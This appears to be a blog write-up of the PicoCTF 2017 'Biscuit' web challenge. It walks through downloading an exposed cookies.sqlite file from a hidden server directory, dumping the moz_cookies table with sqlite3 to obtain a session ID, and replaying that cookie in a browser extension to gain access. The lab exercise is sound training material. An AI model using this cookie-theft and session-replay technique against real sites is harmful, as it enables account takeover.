---
layout:     post
title:      "PicoCTF - Biscuit"
subtitle:   "Write-Ups"
date:       2017-04-15 0:00:00
author:     "W3ndige"
header-img: "img/picoctf-header.jpg"
permalink: /:title/
category: PicoCTF 2017
---
<h1>Biscuit - 75 PTS</h1>

<p>Your friend has a personal website. Fortunately for you, he is a bit of a noob when it comes to hosting a website. Can you find out what he is hiding? </p>

![Website](/img/picoctf/biscuit-web.png){:class="img-responsive center-block"}

<p>Let's view the source. </p>

{% highlight html %}

<html>

<!-- Storing stuff in the same directory as your web server doesn't seem like a good idea -->
<!-- Thankfully, we use a hidden one that is super PRIVATE, to protect our cookies.sqlite file -->
  <style>
    body{
    	background-image: url("private/image.png");
    }
  </style>
  <body >
    <div style='background:white;margin: auto;border: 1px solid red;width: 600px; margin-top: 20%;' >
      <center>
        <form style="font-size: 40px; ">
        Access Denied</form>
      </center>
    </div>
  </body>
</html>
{% endhighlight %}

<p>That's some pretty obvious stuff here. Let's jump to the <b>private</b> directory, and download the <b>cookies.sqlite</b>. </p>

{% highlight html %}
http://shell2017.picoctf.com:30027/private/cookies.sqlite
{% endhighlight %}

<p>Now we have to try and extract the cookies from the file. </p>

{% highlight bash %}
w3ndige@W3ndige ~/Pobrane> sqlite3 cookies.sqlite
SQLite version 3.18.0 2017-03-28 18:48:43
Enter ".help" for usage hints.
sqlite>
{% endhighlight %}

<p>Great! It's working. Now we can view the tables existing in this database, and then extract the password. </p>

{% highlight sql %}
sqlite> SELECT * FROM sqlite_master WHERE type='table';
table|moz_cookies|moz_cookies|2|CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, baseDomain TEXT, appId INTEGER DEFAULT 0, inBrowserElement INTEGER DEFAULT 0, name TEXT, value TEXT, host TEXT, path TEXT, expiry INTEGER, lastAccessed INTEGER, creationTime INTEGER, isSecure INTEGER, isHttpOnly INTEGER, CONSTRAINT moz_uniqueid UNIQUE (name, host, path, appId, inBrowserElement))
sqlite> SELECT * FROM moz_cookies;
1|localhost|0|0|ID|F3MAqpWxIvESiUNLHsflVd|localhost|/|1489365457|1489279130600290|1489279057101857|0|0
sqlite>
{% endhighlight %}

<p>One last step would be editing our cookies using <a href="http://www.editthiscookie.com/">EditThisCookie</a> extension. </p>

![EditThisCookie](/img/picoctf/biscuit-edit.png){:class="img-responsive center-block"}

<p>And lastly reload the page. </p>

![Flag](/img/picoctf/biscuit-flag.png){:class="img-responsive center-block"}

<p>And we have another flag to collect. </p>


<p>~ Stay safe!</p>
